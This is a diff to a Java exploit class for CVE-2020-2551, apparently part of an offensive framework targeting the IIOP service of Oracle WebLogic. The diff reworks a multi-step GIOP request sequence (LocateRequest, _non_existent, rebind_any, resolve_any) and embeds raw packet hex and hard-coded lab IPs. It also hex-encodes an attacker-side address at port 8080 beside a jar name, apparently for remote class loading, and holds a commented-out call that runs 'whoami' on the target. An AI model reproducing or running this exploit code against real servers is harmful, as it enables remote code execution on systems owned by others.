@@ -66,7 +66,7 @@ public class CVE_2020_2551 implements ObjectPayload {
         Socket socket = new Socket(ip, port);
         byte[] nameServiceByte = null;
         try{
-            // op=nameService
+            // step 1: op=LocateRequest
             nameServiceByte = getNameService(socket);
         }catch (Exception e){
             return false;
@@ -82,13 +82,13 @@ public class CVE_2020_2551 implements ObjectPayload {
         }
         // get nat host
         String natHost = "iiop://" + getNatHost(nameServiceStr);
-        // op=_non_existent (get new Key)
+        // step 2: op=_non_existent (get new Key)
         byte[] nonExistentByte = operationNonExistent(socket, key, natHost);
         String newKey = getKey(binaryToHexString(nonExistentByte),false);
         if(!isBlank(newKey)){
             key = newKey;
         }
-        // op=_non_existent
+        // step 3: op=_non_existent
         operationNonExistent(socket, key, natHost, false);
         // op =rebind_any
         String bindName = "1bGpOMicmx6DLLIB";
@@ -98,10 +98,15 @@ public class CVE_2020_2551 implements ObjectPayload {
         if(!REBIND_ANY_OK.equals(rebindAnyHex)){
             return false;
         }
-        // op=resolve_any
+        // step 4: op=resolve_any
         byte[] resolveAnyByte = resolveAny(socket, key, bindName);
         String resolveAnyHex = binaryToHexString(resolveAnyByte);
-        System.out.println(getKey(resolveAnyHex, false));
+        // get new key
+        newKey = getKey(resolveAnyHex, false);
+        if(isBlank(newKey)){
+            return false;
+        }
+
         return null;
     }
 
@@ -118,12 +123,17 @@ public class CVE_2020_2551 implements ObjectPayload {
 
     public static void main(String[] args) throws Exception {
         ObjectPayload payload = new CVE_2020_2551();
-        String ip = "192.168.1.9";
+        String ip = "192.168.1.12";
         Socket socket = new Socket(ip, 7001);
-        String key = "00424541080103000000000c41646d696e53657276657200000000000000003349444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e67436f6e74657874416e793a312e3000000000000238000000000000014245412c000000100000000000000000f76dc085a642e1f0";
-        byte[] resolveAnyByte = resolveAny(socket, key, "HadVv2V3bF7lF1jp");
-        String resolveAnyHex = binaryToHexString(resolveAnyByte);
-        System.out.println(getKey(resolveAnyHex, true).length());
+        String key = "00424541080103000000000c41646d696e53657276657200000000000000003349444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e67436f6e74657874416e793a312e3000000000000432383900000000014245412c000000100000000000000000e5b1d068fce4c4b8";
+//        byte[] resolveAnyByte = resolveAny(socket, key, "j72QLEKYwFKoqebx");
+//        String resolveAnyHex = binaryToHexString(resolveAnyByte);
+        // /com.bea.javascript.jar
+        System.out.println(HexUtil.encodeHexStr("192.168.1.6:8080"));
+//        send("47494f5001020000000000b90000000603000000000000000000007800424541080103000000000c41646d696e53657276657200000000000000003349444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e67436f6e74657874416e793a312e3000000000000432383900000000014245412c000000100000000000000000e5b1d068fce4c4b80000000c7265736f6c76655f616e79000000000000000001000000107452364e4642376841697652523464590000000100",socket);
+//        String resolveAnyHex = "47494f5001020001000002300000000600000000000000000000000e0000002d000000000000001d49444c3a6f6d672e6f72672f434f5242412f4f626a6563743a312e3000000000000000010000000000000044524d493a7765626c6f6769632e636c75737465722e73696e676c65746f6e2e436c75737465724d617374657252656d6f74653a3030303030303030303030303030303000000000010000000000000198000102000000000d3139322e3136382e312e313200001b590000008800424541080103000000000c41646d696e536572766572000000000000000044524d493a7765626c6f6769632e636c75737465722e73696e676c65746f6e2e436c75737465724d617374657252656d6f74653a30303030303030303030303030303030000000000432393500000000014245412c000000100000000000000000e5b1d068fce4c4b800000005000000010000002c0000000000010020000000030001002000010001050100010001010000000003000101000001010905010001000000190000003b0000000000000033687474703a2f2f3139322e3136382e312e31323a373030312f6265615f776c735f696e7465726e616c2f636c61737365732f00000000002000000004000000010000001f000000040000000300000021000000580001000000000001000000000000002200000000004000000000000806066781020101010000001f0401000806066781020101010000000f7765626c6f67696344454641554c540000000000000000000000000000000000";
+//        String newKey = getKey(resolveAnyHex, true);
+//        getServerLocation(socket, newKey, "whoami");
 //        payload.vulnerable(ip, 7001);
     }
 }
